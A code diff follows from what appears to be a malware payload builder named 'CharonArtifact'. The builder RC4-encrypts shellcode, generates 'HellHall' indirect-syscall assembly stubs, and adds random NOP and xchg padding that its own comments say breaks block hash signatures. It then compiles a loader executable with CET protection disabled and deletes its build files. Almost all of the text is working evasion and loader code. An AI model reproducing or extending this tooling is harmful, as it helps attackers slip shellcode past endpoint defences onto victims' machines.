+  // -----------------------------------------------------------------------
   printf("[*] Encrypting (RC4 + KeyGuard)...\n");
   unsigned char realKey[16], protectedKey[16];
   for (int i = 0; i < 16; i++)
@@ -736,32 +867,64 @@ int main(int argc, char *argv[]) {
   char sHint[10];
   sprintf(sHint, "0x%02X", hintByte);
 
-  // 3. Write ASM File
-  printf("[*] Generating syscalls.asm (HellHall + 1024 Stubs)...\n");
+  // -----------------------------------------------------------------------
+  // -----------------------------------------------------------------------
+  // [BUILD STEP 3] Generate Assembly Stubs (Polymorphic)
+  // Create 'syscalls.asm' with the evasion engine and 512 unique entry stubs.
+  // -----------------------------------------------------------------------
+  printf("[*] Generating syscalls.asm (HellHall + 512 Polymorphic Stubs)...\n");
   FILE *fAsm = fopen("syscalls.asm", "w");
   if (fAsm) {
     fputs(g_HellHallAsm, fAsm);
-    // Append 1024 unique stubs to ensure distinct syscall entry points
-    for (int i = 0; i < 1024; i++) {
+    // Target 512 stubs (covers all NTDLL)
+    int STUB_COUNT = 512;
+
+    for (int i = 0; i < STUB_COUNT; i++) {
       fprintf(fAsm, "    PUBLIC Fnc%04X\n", i);
-      fprintf(fAsm, "    ALIGN 16\n");
+      fprintf(fAsm, "    ALIGN 16\n"); // Align to 16 bytes
       fprintf(fAsm, "    Fnc%04X PROC\n", i);
-      fprintf(fAsm, "        mov eax, %d\n", i); // Pass Index to SyscallExec
+
+      // Standard instruction
+      fprintf(fAsm, "        mov eax, %d\n", i);
       fprintf(fAsm, "        jmp SyscallExec\n");
+
+      // Random Junk / NOPs to fill remaining 6 bytes (16 - 10 = 6)
+      // This breaks the block hash signature
+      int padding = rand() % 3; // Choose random pattern
+      if (padding == 0) {
+        // 6 NOPs
+        fprintf(fAsm, "        nop\n        nop\n        nop\n        nop\n    "
+                      "    nop\n        nop\n");
+      } else if (padding == 1) {
+        // 3 byte (xchg r8,r8) + 3 byte (nop, nop, nop) = 6
+        fprintf(fAsm,
+                "        xchg r8, r8\n        nop\n        nop\n        nop\n");
+      } else {
+        // 2 byte (xchg ax,ax) + 2 byte (xchg ax,ax) + 2 byte (nop,nop) = 6
+        fprintf(fAsm, "        xchg ax, ax\n        xchg ax, ax\n        nop\n "
+                      "       nop\n");
+      }
+
       fprintf(fAsm, "    Fnc%04X ENDP\n\n", i);
     }
     fprintf(fAsm, "end\n");
     fclose(fAsm);
   }
 
-  // 4. Assemble
+  // -----------------------------------------------------------------------
+  // [BUILD STEP 4] Assemble & Compile
+  // Invoke ML64 and CL to build the final artifact.
+  // -----------------------------------------------------------------------
   printf("[*] Assembling (ML64)...\n");
   if (system("ml64 /c /Cx /nologo syscalls.asm") != 0) {
     printf("[!] Assembly Failed.\n");
     return 1;
   }
 
-  // 5. Generate C Source
+  // -----------------------------------------------------------------------
+  // [BUILD STEP 5] Generate C Source
+  // Replace placeholders in the artifact template with actual payload/key data.
+  // -----------------------------------------------------------------------
   printf("[*] Generating artifact.c...\n");
   char *step1 = ReplacePattern(g_StubTemplate, "{{HINT_BYTE}}", sHint);
   char *step2 = ReplacePattern(step1, "{{PAYLOAD_BYTES}}", sPayload);
@@ -773,12 +936,18 @@ int main(int argc, char *argv[]) {
     fclose(fC);
   }
 
-  // 6. Compile
+  // -----------------------------------------------------------------------
+  // [BUILD STEP 6] Compile
+  // Compile the artifact C code and link it with the assembly object.
+  // -----------------------------------------------------------------------
   printf("[*] Compiling Artifact (CL)...\n");
   int res = system("cl /nologo /O2 artifact.c syscalls.obj "
                    "/Fe:CharonArtifact.exe /link /CETCOMPAT:NO");
 
-  // 7. Cleanup
+  // -----------------------------------------------------------------------
+  // [BUILD STEP 7] Cleanup
+  // Remove temporary build files.
+  // -----------------------------------------------------------------------
   system("del syscalls.asm syscalls.obj artifact.c artifact.obj >NUL 2>&1");
   free(step1);
   free(step2);
@@ -787,10 +956,11 @@ int main(int argc, char *argv[]) {
   free(sKey);
   free(shellcode);
 
-  if (res == 0)
+  if (res == 0) {
     printf("\n[+] SUCCESS: CharonArtifact.exe created.\n");
-  else
+    return 0;
+  } else {
     printf("\n[!] FAILURE: Compilation error.\n");
-
-  return 0;
+    return 1;
+  }
 }
